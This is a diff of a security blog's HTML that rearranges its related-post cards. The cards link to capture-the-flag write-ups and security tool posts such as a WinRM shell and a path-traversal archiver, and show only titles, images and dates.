-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1609,470 +1670,6 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
 
            
           
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
@@ -2329,41 +1926,6 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
@@ -2400,21 +1962,542 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2462,60 +2545,21 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
         </div>
